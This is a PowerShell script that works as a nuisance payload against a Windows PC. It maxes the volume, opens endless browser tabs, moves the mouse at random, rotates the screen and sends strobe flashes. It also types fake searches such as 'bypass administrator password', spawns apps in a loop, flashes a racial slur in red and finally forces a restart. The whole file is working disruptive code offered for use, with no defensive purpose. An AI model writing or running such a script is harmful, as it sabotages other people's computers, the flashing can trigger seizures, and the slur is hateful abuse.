# ------------------ PHASE 1: AUDIO & DISTRACTION ------------------

# Max Volume
$wshell = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt 50; $i++) {
    $wshell.SendKeys([char]175)
    Start-Sleep -Milliseconds 10
}

# Infinite YouTube Tabs (MP3)
Start-Job {
    while ($true) {
        Start-Process "msedge.exe" "https://www.youtube.com/watch?v=fsHXmys3W5w"
        Start-Sleep -Milliseconds 500
    }
}

Start-Sleep -Seconds 20

# ------------------ PHASE 2: CHAOS ------------------

# 1. Smooth Random Mouse Movement
Start-Job {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class MouseMove {
        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int X, int Y);
    }
"@
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $x = $screen.Width / 2
    $y = $screen.Height / 2
    while ($true) {
        $targetX = Get-Random -Minimum 0 -Maximum $screen.Width
        $targetY = Get-Random -Minimum 0 -Maximum $screen.Height
        for ($i = 0; $i -le 100; $i++) {
            $nx = $x + (($targetX - $x) * $i / 100)
            $ny = $y + (($targetY - $y) * $i / 100)
            [MouseMove]::SetCursorPos([int]$nx, [int]$ny)
            Start-Sleep -Milliseconds 5
        }
        $x = $targetX
        $y = $targetY
    }
}

# 2. Screen Rotation
Start-Job {
    Add-Type -AssemblyName System.Windows.Forms
    $keys = @("^{%}{LEFT}", "^{%}{RIGHT}", "^{%}{UP}", "^{%}{DOWN}")
    while ($true) {
        [System.Windows.Forms.SendKeys]::SendWait($keys | Get-Random)
        Start-Sleep -Seconds 2
    }
}

# 3. Strobe Screen Flashing
Start-Job {
    Add-Type -AssemblyName System.Windows.Forms
    while ($true) {
        $form = New-Object Windows.Forms.Form
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.WindowState = 'Maximized'
        $form.BackColor = [Drawing.Color]::FromArgb((Get-Random -Minimum 0 -Maximum 256),
                                                    (Get-Random -Minimum 0 -Maximum 256),
                                                    (Get-Random -Minimum 0 -Maximum 256))
        $form.Opacity = 0.3
        $form.Show()
        Start-Sleep -Milliseconds 100
        $form.Close()
    }
}

# 4. Typed Edge Spam
Start-Job {
    Add-Type -AssemblyName System.Windows.Forms
    $queries = @(
        "how to crash school laptop",
        "free robux generator",
        "delete system32 tutorial",
        "bypass administrator password",
        "how to nuke chromebook"
    )
    while ($true) {
        $q = $queries | Get-Random
        Start-Process "msedge.exe"
        Start-Sleep -Seconds 2
        foreach ($char in $q.ToCharArray()) {
            [System.Windows.Forms.SendKeys]::SendWait($char)
            Start-Sleep -Milliseconds 20
        }
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        Start-Sleep -Seconds 2
    }
}

# 5. Random App Popups
Start-Job {
    $apps = @("notepad", "calc", "mspaint", "write", "powershell", "cmd")
    while ($true) {
        Start-Process ($apps | Get-Random)
        Start-Sleep -Milliseconds 500
    }
}

# 6. Red Flashing Message (One Word)
Start-Job {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    while ($true) {
        $form = New-Object Windows.Forms.Form
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.WindowState = 'Maximized'
        $form.BackColor = [Drawing.Color]::Black
        $form.Opacity = 0.7

        $label = New-Object Windows.Forms.Label
        $label.Text = "NIGGER"  # Change word here
        $label.Font = New-Object Drawing.Font("Arial", 96, [Drawing.FontStyle]::Bold)
        $label.ForeColor = [Drawing.Color]::Red
        $label.BackColor = [Drawing.Color]::Transparent
        $label.AutoSize = $true
        $label.Location = New-Object Drawing.Point(
            ($form.Width / 2) - 250,
            ($form.Height / 2) - 100
        )

        $form.Controls.Add($label)
        $form.Show()
        Start-Sleep -Milliseconds 400
        $form.Close()
        Start-Sleep -Milliseconds 600
    }
}

# 7. Final Shutdown
Start-Sleep -Seconds 40
Restart-Computer -Force
